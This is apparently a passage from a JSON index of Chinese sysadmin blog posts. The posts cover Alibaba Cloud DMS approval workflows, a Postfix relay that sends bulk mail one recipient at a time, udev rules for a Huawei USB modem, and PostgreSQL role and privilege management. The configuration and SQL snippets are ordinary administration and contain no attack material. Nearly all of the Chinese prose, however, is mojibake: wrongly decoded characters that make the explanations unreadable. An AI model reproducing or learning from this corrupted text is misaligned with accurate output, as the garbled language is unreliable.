PolarDBï¼Œå°±ç”¨ä¸æˆäº†ã€‚\nè¿™äº‹åªèƒ½äº¤ç»™é˜¿é‡Œäº‘çš„dmsæ¥ç®¡ç†äº†ï¼Œå…¶å®dmsè¦æ¯”yearningå¼ºå¤§å¾ˆå¤šï¼Œå¯ä»¥ç²¾ç¡®æ§åˆ¶åˆ°è¡¨çš„è¡Œçº§åˆ«æƒé™çš„ã€‚\nç†ç”±å°±æ˜¯dmsæ˜¯ä¸ªwebé¡µé¢ï¼Œä»£ç†è¿æ¥åˆ°åç«¯çš„æ•°æ®åº“ï¼Œæ‰€ä»¥è¦æ˜¾ç¤ºä»€ä¹ˆï¼Œä¸è¦æ˜¾ç¤ºä»€ä¹ˆï¼Œä»webç•Œé¢æ˜¯å®Œå…¨å¯ä»¥æ§åˆ¶çš„ã€‚å®é™…åˆ°æ•°æ®åº“çº§åˆ«åè€Œæœ‰çš„æ˜¯æ§åˆ¶ä¸ä½çš„ã€‚\nè¿™å°±æ¢³ç†ä¸€ä¸‹å»ºç«‹å®¡æ‰¹æµçš„æ­¥éª¤ï¼š\nä¸€ã€dmsåŒæ­¥ramç”¨æˆ· ramç”¨æˆ·æ˜¯ç®¡ç†çš„åŸºç¡€äº†ï¼Œè¿™äº›ç”¨æˆ·å¿…é¡»å…ˆè¡Œå¯¼å…¥dmsï¼Œæˆ‘ä»¬æ‰èƒ½è¿›ä¸€æ­¥èµ‹äºˆownerï¼ŒDBAçš„æƒé™\nç”¨æˆ·ç®¡ç†\u0026ndash;\u0026gt;åŒæ­¥å­è´¦å·ï¼Œé€‰æ‹©è¦dmsè¦ä½¿ç”¨çš„è´¦å·åŒæ­¥è¿‡æ¥å³å¯\näºŒã€è®¾å®šå®ä¾‹DBA DMSé‡Œçš„æƒé™æ˜¯è¿™æ ·çš„ï¼šåº“çš„è¯æœ‰Ownerï¼Œç„¶åå®ä¾‹çš„è¯æœ‰DBAï¼Œæœ€ä¸Šæ˜¯ç®¡ç†å‘˜ã€‚\né‚£ä¹ˆä¸€ä¸ªå®ä¾‹é‡Œæœ‰å‡ ä¸‡å¼ è¡¨ï¼Œæ²¡äººä¼šæƒ³ä¸€ä¸ªä¸€ä¸ªç‚¹å‡»èµ‹Ownerçš„æƒé™å§ã€‚\né‚£å°±ç²—åˆ†ä¸€ä¸‹ï¼Œä¸€ä¸ªäººå¯¹æ•´ä¸ªå®ä¾‹æœ‰æƒé™å®¡æ‰¹å³å¯ã€‚è¿™æ ·è¦å…ˆè®¾å®šæ•´ä¸ªå®ä¾‹çš„DBAè§’è‰²ã€‚\næˆ‘ä»¬å…ˆç¼–è¾‘ç”¨æˆ·ï¼Œè®©ä»–æœ‰DBAçš„è§’è‰²ï¼Œä»¥ä¾›ä¹‹ååœ¨å®ä¾‹çº§åˆ«å¯ä»¥é€‰æ‹©ä»–\nç„¶åå»å®ä¾‹ç®¡ç†é‡Œé¢ï¼š\né€‰æ‹©å®ä¾‹çš„å³è¾¹ï¼Œæ›´å¤š\u0026ndash;\u0026gt;ç¼–è¾‘å®ä¾‹\nå®ä¾‹çš„è´¦å·ã€å¯†ç ã€å®‰å…¨ååŒã€å®‰å…¨è§„åˆ™éƒ½é€‰ä¸Šï¼Œç„¶åé«˜çº§ä¿¡æ¯é‡Œï¼Œå®ä¾‹DBAå°±å¯ä»¥é€‰æ‹©åˆšæ‰è®¾ç½®äº†DBAè§’è‰²çš„äººäº†\nä¸‰ã€è®¾ç½®å®¡æ‰¹æµç¨‹ ç„¶åå»å®‰å…¨ä¸è§„èŒƒï¼Œå®¡æ‰¹æµç¨‹ï¼Œæ–°å¢å®¡æ‰¹æ¨¡æ¿ï¼Œæ¥è‡ªå®šä¹‰å®¡æ‰¹æµ\næˆ‘ä»¬å…¬å¸çš„å®¡æ‰¹æµä¸æ˜¯380ç¼ºçœé‚£ä¸ªï¼Œ380æ˜¯éœ€è¦ä¸‰ä¸ªäººå®¡æ‰¹çš„ï¼š\næˆ‘ä»¬çš„é“¾è·¯å°±å¾ˆå»ºå•äº†ï¼Œæœ‰æ“ä½œæƒé™çš„äººæ‰¾å®ä¾‹çš„DBAå®¡æ‰¹ï¼Œç„¶åè¿‡æœ€é«˜ç®¡ç†å‘˜æ‰¹å°±å®Œäº†ï¼Œæ‰€ä»¥åšå¦‚ä¸‹çš„æµç¨‹ï¼š\nå››ã€è®¾ç½®å®‰å…¨è§„åˆ™ æˆ‘ä»¬å†åˆ°å®‰å…¨ä¸è§„èŒƒï¼Œç‚¹å‡»å®‰å…¨è§„åˆ™ï¼Œæ‰¾åˆ°å…·ä½“å®ä¾‹é‡Œè®¾ç½®çš„ å¼ºç®¡æ§æ¨¡å¼ for MySQL\nå¯ä»¥çœ‹åˆ°å·²ç»æœ‰2ä¸ªå®ä¾‹ç”¨ä¸Šäº†ï¼Œç„¶ååˆ°å³è¾¹ï¼Œç‚¹å‡»ç¼–è¾‘ï¼š\næœ€ä¸»è¦çš„å°±æ˜¯SQLå˜æ›´ï¼Œæ•°æ®å˜æ›´é»˜è®¤å®¡æ‰¹æ¨¡æ¿çš„è®¾ç½®ï¼Œæˆ‘ä»¬æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„å®¡æ‰¹æµå³å¯\nå…¶ä»–çš„é€‰é¡¹éƒ½å¯ä»¥æŒ‰éœ€è¿›è¡Œä¿®æ”¹ã€‚\näº”ã€è®¾ç½®ç”¨æˆ·æƒé™ å¦‚ä¸Šå®¡æ‰¹æµå°±å®Œæˆäº†ï¼Œæˆ‘ä»¬è¦ç™»å½•å…·ä½“çš„å®ä¾‹åˆ—è¡¨ï¼Œå†æ›´å¤šé‡Œè®¾ç½®æƒé™\næ³¨æ„ä¸Šé¢æ˜¯è®¾ç½®çš„å®ä¾‹çº§åˆ«çš„æƒé™ã€‚\nå¦‚æœè¦è®¾ç½®æ›´ç»†çº§åˆ«çš„åº“ã€è¡¨ã€è¡Œæƒé™ï¼Œéœ€è¦ç‚¹å‡»æ•°æ®åº“åˆ—è¡¨\nåœ¨è¿™é‡Œé¢çš„è¡¨è¯¦æƒ…çš„å³è¾¹æ›´å¤šï¼Œå¯ä»¥æ§åˆ¶åº“ã€è¡¨ã€è¡Œçš„æƒé™\nè¿™æ ·å°±å¯ä»¥å¼„å®Œæ•´ä¸ªæµç¨‹äº†ã€‚\n","date":"2024-03-05","img":"","permalink":"https://rendoumi.com/posts/20240305-aliyun_dms/","series":null,"tags":null,"title":"é˜¿é‡Œäº‘DMSç®¡ç†æ•°æ®åº“å˜æ›´å®¡æ‰¹æµ"},{"categories":null,"content":"è¿™ä¸ªé—®é¢˜ååˆ†çš„è®¨åŒå•Šï¼ŒBiå¤§æ•°æ®éƒ¨ä¼šç¾¤å‘æŠ¥è¡¨é‚®ä»¶ï¼Œä½†æ˜¯å¦‚æœæœ‰æŸä½å‘˜å·¥ç¦»èŒäº†ï¼Œé‚®ä»¶åœ°å€è¢«æ¸…ç†æ‰ä¸å­˜åœ¨äº†ï¼Œé‚£ä¹ˆç¾¤å‘é‚®ä»¶çš„æ—¶å€™ä¼šå¯¼è‡´ç¾¤å‘å¤±è´¥ã€‚\nç½‘ä¸Šæœç´¢äº†ä¸€åœˆï¼Œé˜¿é‡Œæœ‰ç¯‡æ–‡ç« æ˜¯åŒæ ·é—®é¢˜ï¼š\nhttps://blog.csdn.net/javaee_sunny/article/details/114836546 è§£å†³æ–¹æ³•æ˜¯ä¿®æ”¹å‘é€ç¨‹åºï¼Œå‰”é™¤æ‰å¤±æ•ˆçš„é‚®ä»¶åœ°å€å†å‘ã€‚\nè¿™ä¸ªæ–¹æ³•åœ¨æˆ‘ä»¬è¿™é‡Œæ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºå‘é€ç¨‹åºæ²¡äººç»´æŠ¤äº†ï¼Œæ— æ³•ä¿®æ”¹ã€‚\né‚£å°±åªèƒ½æ›²çº¿æ•‘å›½äº†ï¼šå»ºç«‹ä¸€ä¸ªè½¬å‘æœåŠ¡å™¨ï¼ŒæŠŠç¾¤å‘é‚®ä»¶å˜æˆä¸€å°ä¸€ä»½å•ç‹¬å‘ï¼Œé‚£ä¹ˆå¶å°”ä¸€ä»½å¤±è´¥å°±å¤±è´¥äº†ï¼Œä¸ä¼šå¯¼è‡´æ•´ä¸ªç¾¤å‘çš„å¤±è´¥ã€‚\næ­å»ºä¸€ä¸ªPostfix relayè½¬å‘æœåŠ¡å™¨ï¼š\n1vi /etc/postfix/main.cf 2 3relayhost = [smtp.qiye.aliyun.com]:587 4smtp_sasl_auth_enable = yes 5smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd 6smtp_sasl_security_options = noanonymous 7smtp_use_tls = yes 8smtp_tls_CAfile = /etc/pki/tls/certs/ca-bundle.crt 9smtp_sender_dependent_authentication = yes 10smtp_destination_recipient_limit = 1 11message_size_limit=102400000 è§£é‡Šï¼šè½¬å‘åˆ°é˜¿é‡Œé‚®ä»¶æœåŠ¡å™¨çš„æ ‡å‡†é…ç½®ï¼Œç½‘ç»œä¸Šå·²ç»æœ‰å¾ˆå¤šæ•™ç¨‹äº†ã€‚ç„¶åå…³é”®å°±ä¸€æ¡smtp_destination_recipient_limit = 1,è¿™ä¸ªå°±ä¼šæŠŠç¾¤å‘çš„é‚®ä»¶æ‹†æˆå•ç‹¬çš„ä¸€å°ä¸€å°å‘é€ï¼Œå‘ä¸å‡ºå»çš„ä¼šå›åˆ°queueå°è¯•ä¸æ–­å‘é€ï¼Œæœ€åå¤±è´¥dropæ‰ã€‚\nå¦å¤–postfixç¼ºçœå‘é€é‚®ä»¶çš„å¤§å°æ˜¯10Mï¼Œé˜¿é‡Œé‚®å±€ç¼ºçœæ˜¯50Mï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œmessage_size_limit=102400000æ”¹æˆ100Mçš„é™åˆ¶ã€‚\næœ€åç”Ÿæˆä¸€ä¸‹é‚®ä»¶ç”¨æˆ·çš„hashåº“ï¼š\n1vi /etc/postfix/sasl_passwd 2[smtp.qiye.aliyun.com]:587 report@ddky.com:xxxxxxxx 3 4postmap /etc/postfix/sasl_passwd é‚£ä¹ˆå‘é‚®ä»¶çš„æ—¶å€™æŒ‡å®šè¿™å°æœåŠ¡å™¨ï¼Œç”¨æˆ·åæ˜¯ report@ddky.com , å¯†ç æ˜¯xxxxxxxxå°±å¯ä»¥äº†\nè¡¥å……ï¼Œéœ€è¦å®‰è£…ç¼ºå°‘çš„åº“ï¼Œå¦åˆ™ç™»å½•é˜¿é‡Œé‚®å±€è¿‡ä¸å»ï¼Œè¿˜éœ€è¦æ‰“å¼€æœåŠ¡å™¨çš„å…è®¸ç½‘æ®µåˆ—è¡¨ï¼Œmynetwork\n1yum install -y cyrus-sasl-plain ","date":"2024-03-04","img":"","permalink":"https://rendoumi.com/posts/20240304-posfix_relay/","series":null,"tags":null,"title":"é‚®ç®±åœ°å€æ— æ•ˆå¯¼è‡´ç¾¤å‘é‚®ä»¶å¤±è´¥"},{"categories":null,"content":"è¿™ä¸æ˜¯è¦å‡ºå›½å°±æå‰æ­å»ºäº†ä¸€ä¸ªvoipçš„ç”µè¯ç³»ç»Ÿä¹ˆï¼Œç»“æœåœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œåä¸ºçš„çŒ«æ£’å±…ç„¶å‡ºç°åœ°å€æ¥å›è·³åŠ¨çš„é—®é¢˜ã€‚\næ­£å¸¸æƒ…å†µä¸‹ï¼Œlsusbçš„ç»“æœ\n1lsusb 2 3Bus 001 Device 017: ID 12d1:1436 Huawei Technologies Co., Ltd. Broadband stick è¿‡ä¸€é˜µå­ï¼Œæˆ–è€…æŒç»­å‡ å¤©åï¼Œåœ°å€å°±å˜äº†\n1lsusb 2 3Bus 001 Device 017: ID 12d1:1446 Huawei Technologies Co., Ltd. HSPA modem çœ‹ä¸Šé¢ï¼Œvender idä»1436å˜æˆäº†1446ï¼Œåå­—ä¹Ÿä»stickå˜æˆäº†modem\nç”±äºè¿™ä¸ªusbè®¾å¤‡æ˜¯ç›´é€šåˆ°kvmçš„freepbxè™šæœºé‡Œé¢å»çš„ï¼Œè¿™ç›´æ¥å¯¼è‡´voipç³»ç»Ÿä¸èƒ½ç”¨äº†ï¼Œå¯æ¶å•Šã€‚\nå¿…é¡»æŠŠå®ƒç»™å›ºå®šä¸‹æ¥ï¼Œé¦–å…ˆå…ˆä»1446å˜å›1436\n1yum -y install epel-release 2yum -y install use_modeswitch 3 4usb_modeswitch -v 12d1 -p 1446 -c \u0026#34;/usr/share/usb_modeswitch/12d1:1446\u0026#34; å˜å›æ¥äº†ä¸æˆï¼Œè¿˜å¾—æŠŠå®ƒå½»åº•å›ºå®šä¸‹æ¥\n1vi /lib/udev/rules.d/40-usb_modeswitch.rules 2 3#è£…äº†usb_modeswitchåå±…ç„¶å·²ç»è‡ªå¸¦äº† 4# Generic entry for most Huawei devices, excluding Android phones 5ATTRS{idVendor}==\u0026#34;12d1\u0026#34;, ATTRS{manufacturer}!=\u0026#34;Android\u0026#34;, ATTR{bInterfaceNumber}==\u0026#34;00\u0026#34;, ATTR{bInterfaceClass}==\u0026#34;08\u0026#34;, RUN+=\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34; shitï¼Œä¸ç®¡å®ƒï¼Œå†æ¬¡å¼ºè¡Œå›ºå®š\n1vi /lib/udev/rules.d/40-usb_modeswitch.rulesã€ 2 3# Huawei, newer modems 4ATTR{idVendor}==\u0026#34;12d1\u0026#34;, ATTR{idProduct}==\u0026#34;1446\u0026#34;, RUN+=\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34; è¿™æ ·å°±æå®šäº†ï¼Œå¾—äºæå‰å‘ç°äº†è¿™é—®é¢˜ï¼Œå¦åˆ™è·‘åˆ°å›½å¤–å†å‘ç°ï¼Œå°±æ™šäº†ï¼\n","date":"2024-02-16","img":"","permalink":"https://rendoumi.com/posts/20240216-lsusb_huawei/","series":null,"tags":null,"title":"Voipçš„lsusbæ£€æµ‹åä¸ºçŒ«æ£’usbåœ°å€æ¥å›è·³åŠ¨"},{"categories":null,"content":"å…¬å¸é€‰ç”¨äº†é˜¿é‡Œäº‘çš„PolarDBåšæ•°æ®åº“ï¼Œè¿™ä¸ªä¸œè¥¿å…¶å®å°±æ˜¯Postgreså¢åŠ äº†å¤–æŒ‚ï¼Œå¯ä»¥æ”¯æŒOracleè¯­æ³•ã€‚\næ²¡åŠæ³•ï¼Œå¾—ä»”ç»†ç ”ç©¶ä¸€ä¸‹Postgresçš„ç”¨æˆ·ç®¡ç†äº†ã€‚\nPostgreSQLæƒé™æ¶æ„æ˜¯å®å¡”å½¢ç»“æ„\næœ€ä¸Šå±‚æ˜¯å®ä¾‹\nå®ä¾‹ä¸­å…è®¸åˆ›å»ºå¤šä¸ªæ•°æ®åº“\næ¯ä¸ªæ•°æ®åº“ä¸­å¯ä»¥åˆ›å»ºå¤šä¸ªschemaï¼Œ\næ¯ä¸ªschemaä¸‹é¢å¯ä»¥åˆ›å»ºå¤šä¸ªå¯¹è±¡ã€‚\nå¯¹è±¡åŒ…æ‹¬è¡¨ã€ç‰©åŒ–è§†å›¾ã€æ“ä½œç¬¦ã€ç´¢å¼•ã€è§†å›¾ã€åºåˆ—ã€å‡½æ•°ã€â€¦ ç­‰ç­‰ã€‚\nä¸Šé¢schemaä¸­æœ‰ä¸ªå¥‡æ€ªçš„ä¸œè¥¿ï¼Œpublicï¼Œæ³¨æ„ï¼šæ˜¯å°å†™ã€‚\nå…ˆæ€»ç»“ï¼šPUBLICæ˜¯ç¼ºçœçš„æƒé™ï¼Œä»£è¡¨æ‰€æœ‰äººçš„æ„æ€ï¼ˆæ˜¯ä¸ªè§’è‰²ï¼‰ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨åˆ›å»ºæ•°æ®åº“ä¹‹åï¼Œå…è®¸PUBLICè§’è‰²(å¤§å†™)è¿æ¥ï¼Œå³å…è®¸ä»»ä½•äººè¿æ¥ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œæ•°æ®åº“åœ¨åˆ›å»ºåï¼Œä¸å…è®¸é™¤äº†è¶…çº§ç”¨æˆ·å’Œowneræ‰€æœ‰è€…ä¹‹å¤–çš„ä»»ä½•äººåœ¨æ•°æ®åº“ä¸­åˆ›å»ºschemaã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨åˆ›å»ºæ•°æ®åº“ä¹‹åï¼Œä¼šè‡ªåŠ¨åˆ›å»ºåä¸º public çš„schemaï¼Œè¿™ä¸ªschemaçš„allæƒé™å·²ç»èµ‹äºˆç»™PUBLICè§’è‰²ï¼ˆæ³¨æ„æ˜¯å¤§å†™ï¼‰ï¼Œå³å…è®¸ä»»ä½•äººåœ¨é‡Œé¢åˆ›å»ºå¯¹è±¡ã€‚\nschemaçº§åˆ«çš„æƒé™ï¼ŒåŒ…æ‹¬å…è®¸æŸ¥çœ‹schemaä¸­çš„å¯¹è±¡(USAGE)ï¼Œä»¥åŠå…è®¸åœ¨schemaä¸­åˆ›å»ºå¯¹è±¡(CREATE)ã€‚\né»˜è®¤æƒ…å†µä¸‹æ–°å»ºçš„schemaçš„æƒé™ä¸ä¼šèµ‹äºˆç»™PUBLICè§’è‰²ï¼Œå› æ­¤é™¤äº†è¶…çº§ç”¨æˆ·å’Œownerï¼Œä»»ä½•äººéƒ½æ²¡æœ‰æƒé™æŸ¥çœ‹schemaä¸­çš„å¯¹è±¡æˆ–è€…åœ¨schemaä¸­æ–°å»ºå¯¹è±¡ã€‚\nä¸¾ä¾‹æ¥è¯´ï¼Œå»ºäº†ä¸ªåº“ï¼Œåˆå»ºäº†ç”¨æˆ·ï¼Œæ²¡ç»™è¿™ä¸ªç”¨æˆ·èµ‹äºˆä»»ä½•æƒé™ã€‚ç¼ºçœä»–å°±ä»PUBLICè§’è‰²ç»§æ‰¿äº†å¯¹åº“é‡Œçš„schema.pulicæƒé™ï¼Œå¯ä»¥è¿æ¥åˆ°è¿™ä¸ªschema.pulicï¼Œå¹¶ä¸”åœ¨è¿™é‡Œå»ºä¸´æ—¶è¡¨ã€å»ºè¡¨ã€viewç­‰ç­‰å¯¹è±¡ï¼Œä½†æ˜¯æ²¡åŠæ³•å»ºç«‹å…¶å®ƒschemaã€‚\nPostgreSQLçš„æ¨¡å¼ï¼ˆSCHEMAï¼‰å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªè¡¨çš„é›†åˆã€‚\nä¸€ä¸ªæ¨¡å¼å¯ä»¥åŒ…å«è§†å›¾ã€ç´¢å¼•ã€æ•°æ®ç±»å‹ã€å‡½æ•°å’Œæ“ä½œç¬¦ç­‰ã€‚\nå†æ¥è¯´è§’è‰²ï¼š\nåœ¨æ•°æ®åº“ä¸­æ‰€æœ‰çš„æƒé™éƒ½å’Œè§’è‰²æŒ‚é’©ã€‚\nè§’è‰²å’Œç”¨æˆ·çš„å”¯ä¸€åŒºåˆ«åœ¨äºï¼Œè§’è‰²æ˜¯nologinçš„ï¼Œè€Œç”¨æˆ·å…è®¸loginï¼Œä»…æ­¤è€Œå·²ã€‚\nè€Œ\u0026quot;PUBLIC\u0026quot;æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è§’è‰²ï¼Œä»£è¡¨ç€æ‰€æœ‰äººã€‚\né‚£åˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼š\næ¯ä¸ªPostgreSQLå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåä¸ºâ€œæ‰€æœ‰è€…â€çš„ç‰¹æ®Šè§’è‰²ã€‚åªæœ‰æ‰€æœ‰è€…æ‰èƒ½æ‰§è¡ŒæŸäº›æ“ä½œï¼Œå¦‚ ALTER TABLE ï¼Œè€Œä½ ä¸èƒ½å°†è¿™æ ·çš„æƒé™æˆäºˆéæ‰€æœ‰è€…ã€‚\né‚£ä¸å¯èƒ½åªæœ‰ä¸€ä¸ªäººå¯ä»¥alterè¡¨ç»“æ„å§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è§’è‰²ç»§æ‰¿æ¥è§£å†³æ­¤é—®é¢˜ã€‚åˆ›å»º table_owner è§’è‰²å¹¶ä¸” GRANT table_owner TO user1, user2 ï¼ˆuser1å’Œuser2ç»§æ‰¿table_owner)ï¼Œç„¶åèµ‹æƒ ALTER TABLE my_table OWNER TO table_owner èµ‹äºˆtable_owneræ‰€æœ‰è€…è§’è‰²ã€‚ç°åœ¨è¡¨çš„æ‰€æœ‰è€…æ˜¯ table_owner äº†ï¼Œä½†æ˜¯å› ä¸º user1 å’Œ user2 æ˜¯è¯¥è§’è‰²çš„æˆå‘˜ï¼Œæ‰€ä»¥ä»–ä»¬ä¹Ÿå…·æœ‰ç»§æ‰¿æƒé™æ¥è¿è¡Œ ALTER TABLEäº†ï¼Œå¦‚ä¸‹å›¾ ã€‚\nå•°å—¦äº†è¿™ä¹ˆå¤šï¼Œé™¤äº†ä¿®æ”¹pg_hba.confï¼Œèµ‹æƒçš„å‘½ä»¤å°±ä¸¤æ¡ï¼Œgrantå’Œrevokeï¼Œçœ‹ä¸‹å›¾ï¼š\nè¿›å…¥å®æˆ˜ï¼Œé¦–å…ˆä»ä¸Šåˆ°ä¸‹éƒ½çœ‹ä¸€çœ‹ï¼Œæœ‰ä»€ä¹ˆåº“ï¼Œæœ‰ä»€ä¹ˆschemaï¼Œæœ‰ä»€ä¹ˆå¯¹è±¡ï¼Œæœ‰ä»€ä¹ˆè¡¨ï¼Œæœ‰ä»€ä¹ˆç´¢å¼•ï¼Œæœ‰ä»€ä¹ˆè§’è‰²ï¼š\n1#æ¨èç”¨psqlæ¥è¿›è¡Œç®¡ç†ï¼Œæœ‰å¾ˆå¤šå¿«æ·é”®ï¼Œnavicaté‡Œé¢æ˜¯æ²¡æœ‰çš„ 2#æ²¡æœ‰çš„è¯å°±è£…ä¸€ä¸ª 3yum install postgresql.x86_64 4 5psql -h 10.8.2.61 -U admin 6 7#å¿…ç”¨å¿«æ·é”® 8#åˆ—å‡ºæ‰€æœ‰çš„åº“ 9\\l 10 11#åˆ—å‡ºæ‰€æœ‰çš„schema 12\\dn 13 14#çœ‹schema.publicæƒé™ 15\\dn+ public 16 17#åˆ—å‡ºæ‰€æœ‰çš„å¯¹è±¡ï¼ˆtable, view, sequencesï¼‰ 18\\d 19 20#åˆ—å‡ºæ‰€æœ‰çš„è§’è‰² 21\\du 22 23#åˆ—å‡ºæ‰€æœ‰è¡¨ 24\\dt 25 26#åˆ—å‡ºæ‰€æœ‰ç´¢å¼• 27\\di 28 29 30#åŒæ ·çš„sql 31select * from pg_roles; 32 33#çœ‹çœ‹èƒ½ç™»å½•çš„ç”¨æˆ·æœ‰å“ªäº› 34select * from pg_user; é‚£è‡ªé¡¶å‘ä¸‹å¼€å§‹ï¼š\n1#å»ºç«‹boms_adminè§’è‰²ï¼šéè¶…çº§ç”¨æˆ·+å¯ä»¥å»ºç«‹db+å¯ä»¥å»ºç«‹role+å¯ä»¥æŠŠæƒé™ç»§æ‰¿ç»™åˆ«äºº 2create role boms_admin nosuperuser createdb createrole inherit; 3 4#å»ºç«‹ç”¨æˆ·ï¼Œç»§æ‰¿bomsuserçš„æƒé™ï¼Œå¯ä»¥ç™»å½•ï¼Œæœ‰å¯†ç  5CREATE role bomsuser in role boms_admin login password â€˜passwordâ€™; 6 7#å»ºç«‹åº“ï¼Œowneræ˜¯boms_admin 8create database bomsdb owner boms_admin; 9 10#ç”¨æ–°ç”¨æˆ·è¿æ¥æ–°çš„DBï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨è¶…çº§ç”¨æˆ·è¿æ¥ï¼Œè¿™ä¸¤äººéƒ½æœ‰æƒé™ 11\\c bomsdb bomsuser; 12\\c bomsdb superuser; 13 14#å…ˆå»ºç«‹ä¸ªschemaï¼Œå¹¶ä¸”åœ¨schemaé‡Œå»ºä¸ªè¡¨ 15create schema zrr; 16create table zrr.test (x integer); 17insert into zrr.test values (1),(2),(3); 18select * from zrr.test; 19 20#å¬å›PUBLICå¯ä»¥åœ¨æ•°æ®åº“çº§åˆ«ä¸­database testä¸­è¿æ¥ã€ä½¿ç”¨ä¸´æ—¶è¡¨çš„æƒé™ 21revoke connect, temporary on database bomsdb from public; 22 23#å¬å›PUBLICå¯ä»¥åœ¨schemaçº§åˆ«ä¸­å¯ä»¥USAGEä½¿ç”¨å’ŒCREATEå»ºç«‹çš„æƒé™ï¼Œæ³¨æ„ï¼Œä½ ç°åœ¨è¿æ¥çš„æ˜¯å“ªä¸ªåº“ï¼Œå¬å›çš„å°±æ˜¯å“ªä¸ªåº“çš„public 24#è¿™é‡Œè¿çš„æ˜¯bomsdbåº“ï¼Œå¬å›çš„å°±æ˜¯è¿™ä¸ªåº“é‡Œçš„schema.public 25REVOKE USAGE, CREATE ON SCHEMA public FROM public; 26 27#è¿™æ ·æ“ä½œä¹‹ååªæœ‰ownerå’Œsuperuserå¯ä»¥ç”¨è¿™ä¸ªdatabaseäº† 28#æˆ‘ä»¬å¿…é¡»æ˜¾å¼èµ‹æƒæ‰å¯ä»¥è¿ä¸Šå¹¶ä¸”å»ºåº“äº† 29 30#å»ºä¸ªæ–°ç”¨æˆ· 31create user testuser login password â€˜password\u0026#39;; 32 33#èµ‹è¿æ¥æƒé™ï¼Œèµ‹äºˆä¸€ä¸ªè¡¨çš„åªè¯»æƒé™ 34grant connect on database bomsdb to testuser; 35grant usage on schema zrr to testuser; 36grant select on table zrr.test to testuser; 37 38#è¿æ¥ä¸Šå»ï¼Œæµ‹ä¸€ä¸‹ 39\\c bomsdb testuser; 40select * from zrr.test; ä¸¤ä¸ªè„šæœ¬ï¼š\nAã€çœ‹ç”¨æˆ·test1éƒ½æœ‰å•¥è¡¨æƒé™\n1SELECT grantee,table_schema,table_name, string_agg( privilege_type,\u0026#39;, \u0026#39; ) as privilege_type 2FROM information_schema.role_table_grants 3where grantee=\u0026#39;test1\u0026#39; 4group by table_name,table_schema,grantee; Bã€çœ‹è¡¨xxxéƒ½æ˜¯ä»€ä¹ˆç”¨æˆ·æ‰æœ‰æƒé™\n1SELECT grantee,table_schema,table_name,string_agg( privilege_type,\u0026#39;, \u0026#39; ) as privilege_type 2FROM information_schema.role_table_grants 3WHERE table_name=\u0026#39;xxx\u0026#39; 4group by grantee,table_schema,table_name; æç¤ºæ— æƒé™çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‡½æ•°æ¥æ£€æŸ¥\n1select has_database_privilege(user, database, privilege); 2 3select has_schema_privilege(user, schema, privilege); 4 5select has_table_privilege(user, table, privilege); å¤ªè´¹åŠ²äº†ï¼ŒèŠ±äº†ä¸¤å¤©æ—¶é—´æ‰ç®—å¤§æ¦‚ææ˜ç™½ã€‚\nå†ç»™ä¸ªåˆå§‹çš„ç›´ç™½è§£é‡Šè„šæœ¬ï¼š\næ¦‚å¿µç¥ï¼š\nä¸€ã€æƒé™ç®¡ç†åœ¨ PostgreSQL ä¸­æ˜¯é€’å½’å’Œåˆ†å±‚çš„ï¼Œå› æ­¤éœ€è¦åˆ†åˆ«ç®¡ç†1ã€æ•°æ®åº“ã€2ã€æ¨¡å¼ï¼Œ3ã€ä»¥åŠæ¨¡å¼ä¸­çš„å…·ä½“å¯¹è±¡ï¼ˆå¦‚è¡¨ï¼‰ã€‚ä¸‰ç§çº§åˆ«ä¸­çš„æƒé™ã€‚ äºŒã€PostgreSQL çš„æƒé™æ¨¡å‹æ˜¯ç´¯åŠ çš„ã€‚ 1#é¦–å…ˆç”¨adminç™»å½• 2 3#å»ºç«‹ä¸€ä¸ªåº“ 4CREATE DATABASE test; 5 6#è¿™æ—¶å€™schema.publicç›´æ¥å°±è¢«å»ºç«‹äº†ï¼Œè€Œä¸”PUBLICç›´æ¥èµ‹æƒäº† 7#è¿™æ—¶å€™å»\\dn+ public 8\\dn+ public 9 List of schemas 10 Name | Owner | Access privileges | Description 11--------+---------+--------------------+------------------------ 12 public | dbadmin | dbadmin=UC/dbadmin+| standard public schema 13 | | =UC/dbadmin | 14#ä¸Šé¢å‘½ä»¤å¯ä»¥çœ‹åˆ°åªæœ‰dbadminæ˜¯Ownerï¼Œä¸”æƒé™æ˜¯UC 15#ä½†å®é™…ä»PGadminé‡Œé¢çœ‹ï¼Œè¿˜æœ‰ä¸ªPUBLIC UCï¼ˆUSAGE+CREATE)çš„æƒé™ï¼Œç¼ºçœå°±èµ‹äºˆäº† 16 17 18#ä¸‹é¢ä¸€å¥è™½ç„¶å¬å›äº†publicå¯¹åº“çš„æƒé™ï¼Œä½†æ˜¯ï¼Œå»ºåº“å°±ç¼ºçœæœ‰çš„PUBLICå¯¹schemaçš„æƒé™ä¸ä¼šæ¶ˆå¤± 19#å› ä¸ºpostgresçš„æƒé™æœºåˆ¶æ˜¯ç´¯åŠ æœºåˆ¶ 20#å› æ­¤ï¼Œä½ æ’¤é”€äº†æ•°æ®åº“å±‚é¢çš„æƒé™ï¼Œä½†æ²¡æœ‰è§¦åŠ public schema æœ¬èº«çš„æƒé™ã€‚ 21REVOKE ALL ON DATABASE test FROM public; 22 23#å»ºç«‹è§’è‰²ç»„ï¼Œå¹¶ä¸”å¯ä»¥è¿æ¥åˆ°æ•°æ®åº“ï¼Œåœ¨åº“çº§åˆ«èµ‹äºˆæ‰€æœ‰æƒé™ 24#ä¾ç„¶åªä¼šå åŠ ï¼Œä¸ä¼šå½±å“åˆ°public schemaçš„æƒé™ 25CREATE ROLE test_project; 26GRANT CONNECT ON DATABASE test TO test_project; 27GRANT ALL PRIVILEGES ON DATABASE test 